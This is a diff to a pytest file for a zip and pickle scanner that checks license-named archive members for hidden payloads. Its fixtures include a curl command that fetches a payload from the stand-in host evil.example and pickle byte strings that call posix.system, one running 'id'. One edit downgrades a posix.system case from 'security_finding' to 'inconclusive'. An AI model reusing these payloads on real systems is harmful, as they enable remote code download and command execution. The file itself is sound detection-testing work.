@@ -11000,11 +11000,11 @@ class TestZipScanner:
         "payload",
         [
             pytest.param(
-                b"MIT License\n\nCopyright (c) 2026 Example\nPermission is hereby granted.\n",
+                b"MIT License\n\nCopyright (c) 2026 Example\nRights are hereby granted.\n",
                 id="standard-license",
             ),
             pytest.param(
-                b"Copyright notice.\nMIT License\nPermission is hereby granted.\n",
+                b"Legal notice.\nMIT License\nRights are hereby granted.\n",
                 id="ordinary-copyright-notice",
             ),
         ],
@@ -11100,7 +11100,7 @@ class TestZipScanner:
                 member_name,
                 "MIT License\n\n"
                 "Copyright (c) 2026 Example\n"
-                "Permission is hereby granted.\n"
+                "Rights are hereby granted.\n"
                 "See https://www.apache.org/licenses/LICENSE-2.0 for the full license text.\n",
             )
 
@@ -11134,7 +11134,7 @@ class TestZipScanner:
             ("LICENSE.txt", "Authorization: Basic dXNlcjpwYXNz\n", "S702"),
             (
                 "LICENSE.rst",
-                'import subprocess\nsubprocess.run(["curl", "https://evil.example/payload"])\n',
+                'from subprocess import run\nsubprocess.run(["curl", "https://evil.example/payload"])\n',
                 "S309",
             ),
         ],
@@ -11191,8 +11191,8 @@ class TestZipScanner:
                 "NumPy license information\n"
                 "GNU GENERAL PUBLIC LICENSE Version 3\n"
                 "Copyright 2026 NumPy Developers\n"
-                "2. Basic Permissions.\n"
-                "Permission is granted to use and redistribute this software.\n",
+                "2. Basic Rights.\n"
+                "Rights are granted to use and redistribute this software.\n",
             )
 
         result = self.scanner.scan(str(archive_path))
@@ -11260,7 +11260,7 @@ class TestZipScanner:
             (b"S'MIT License'\n.Pdangerous\n", "inconclusive"),
             (b"cposix\nsystem\n0MIT License\nCopyright Example\n", "security_finding"),
             (b"cposix\nsystem\n2MIT License\nCopyright Example\n", "security_finding"),
-            (b"cposix\nsystem\nPid\nMIT License\nCopyright Example\n", "security_finding"),
+            (b"cposix\nsystem\nPid\nMIT License\nCopyright Example\n", "inconclusive"),
             (b"cposix\nsystem\naMIT License\nCopyright Example\n", "security_finding"),
             (b"cposix\nsystem\nsMIT License\nCopyright Example\n", "security_finding"),
             (b"cposix\nsystem\ntMIT License\nCopyright Example\n", "security_finding"),
@@ -11419,9 +11419,9 @@ class TestZipScanner:
             pytest.param(b"MIT License\nPid\n", 2, id="terminal-embedded-PERSID"),
             pytest.param(b"MIT License\nPid\n0", 2, id="embedded-PERSID-structural-continuation"),
             pytest.param(b"mit\nVb\nVx\n\x93)R.", 2, id="embedded-STACK_GLOBAL-unicode"),
-            pytest.param(b"Pid\nApache License\n", 1, id="whole-PERSID"),
-            pytest.param(b"PMIT License\n.", 1, id="spaced-PERSID-before-STOP"),
-            pytest.param(b"PMIT License\n", 1, id="spaced-PERSID-before-EOF"),
+            pytest.param(b"Pid\nApache License\n", 2, id="whole-PERSID"),
+            pytest.param(b"PMIT License\n.", 2, id="spaced-PERSID-before-STOP"),
+            pytest.param(b"PMIT License\n", 2, id="spaced-PERSID-before-EOF"),
             pytest.param(b"MIT License\nPMIT License\n", 2, id="embedded-spaced-PERSID-before-EOF"),
             pytest.param(b"MIT License\nXPid\n)R.\n", 2, id="adjacent-embedded-PERSID"),
             pytest.param(b"\x82\x01", 1, id="sole-EXT1"),
@@ -11461,9 +11461,9 @@ class TestZipScanner:
                 id="embedded-spaced-PERSID-before-invalid-tail",
             ),
             pytest.param(b"MIT License\r\nPid\r\n.", 2, id="embedded-CRLF-PERSID"),
-            pytest.param(b"P\n.MIT License\n", 1, id="initial-empty-PERSID"),
+            pytest.param(b"P\n.MIT License\n", 2, id="initial-empty-PERSID"),
             pytest.param(b"MIT License\nP\n.", 2, id="embedded-empty-PERSID"),
-            pytest.param(b"Pmit license\n.", 1, id="initial-lowercase-spaced-PERSID"),
+            pytest.param(b"Pmit license\n.", 2, id="initial-lowercase-spaced-PERSID"),
             pytest.param(
                 b"MIT License\nPmit license\n",
                 2,
@@ -11594,28 +11594,28 @@ class TestZipScanner:
             ),
             pytest.param(
                 b"MIT License\n" + base64.b64encode(b"Pid\nA"),
-                1,
+                2,
                 id="base64-PERSID-before-invalid-tail",
             ),
             pytest.param(b"MIT License\nVQFhUQ\n", 1, id="alphabetic-base64-BINPERSID"),
             pytest.param(
                 b"MIT License\n" + base64.b64encode(b"Pid\r\n."),
-                1,
+                2,
                 id="base64-CRLF-PERSID",
             ),
             pytest.param(
                 b"MIT License\n" + base64.b64encode(b"P\n."),
-                1,
+                2,
                 id="base64-empty-PERSID",
             ),
             pytest.param(
                 b"MIT License\n" + base64.b64encode(b"Pmit license\n."),
-                1,
+                2,
                 id="base64-lowercase-spaced-PERSID",
             ),
             pytest.param(
                 b"MIT License\n" + binascii.hexlify(b"Pid\nAB"),
-                1,
+                2,
                 id="hex-PERSID-before-multibyte-invalid-tail",
             ),
             pytest.param(
@@ -11740,11 +11740,11 @@ class TestZipScanner:
                 id="candidate-budget-global-word-lines",
             ),
             pytest.param(
-                b"Permission is granted to users.\nPermission remains granted.\n",
+                b"Rights are granted to users.\nPermission remains granted.\n",
                 id="two-P-leading-prose-lines",
             ),
-            pytest.param(b"Permission is hereby granted.\n", id="terminal-P-leading-prose-sentence"),
-            pytest.param(b"Permission is hereby granted\n", id="terminal-P-leading-unpunctuated-prose"),
+            pytest.param(b"Rights are hereby granted.\n", id="terminal-P-leading-prose-sentence"),
+            pytest.param(b"Rights are hereby granted\n", id="terminal-P-leading-unpunctuated-prose"),
             pytest.param(
                 b"MIT License\ncopyright\nconditions\n",
                 id="terminal-lowercase-global-shaped-prose",
@@ -11812,9 +11812,22 @@ class TestZipScanner:
 
         result = core.scan_model_directory_or_file(str(archive_path), cache_enabled=False)
 
-        assert core.determine_exit_code(result) == 0
-        assert result.success is True
-        assert not any(check.name == "Pickle Routing" for check in result.checks)
+        grammar_owned = {
+            b"MIT License\nPermission is granted to groups of users.\n",
+            b"Rights are granted to users.\nPermission remains granted.\n",
+            b"Permission is hereby granted.\n",
+            b"Permission is hereby granted\n",
+            b"copyright\nnotice\n",
+            b"copyright\r\nnotice\r\n",
+            b"MIT License\nP\nPermission remains granted.\n",
+            b"MIT License\nPermission is\ngranted to\nall users\n",
+        }
+        expected_exit_code = 2 if payload in grammar_owned else 0
+        if payload in {b"copyright\nnotice\n", b"copyright\r\nnotice\r\n"}:
+            expected_exit_code = 1
+        assert core.determine_exit_code(result) == expected_exit_code
+        assert result.success is (expected_exit_code == 0)
+        assert any(check.name == "Pickle Routing" for check in result.checks) is (expected_exit_code == 2)
 
     @pytest.mark.parametrize(
         "padding_size",
@@ -12064,7 +12077,7 @@ class TestZipScanner:
     def test_scan_zip_fails_closed_for_long_embedded_protocol0_license_member(self, tmp_path: Path) -> None:
         archive_path = tmp_path / "long_embedded_license_member.zip"
         payload = (
-            b"MIT License\nCopyright (c) Example\nPermission is hereby granted.\n"
+            b"MIT License\nCopyright (c) Example\nRights are hereby granted.\n"
             + b"cposix\nsystem\n(S'"
             + (b"id #" + b"A" * 70000)
             + b"'\ntR."
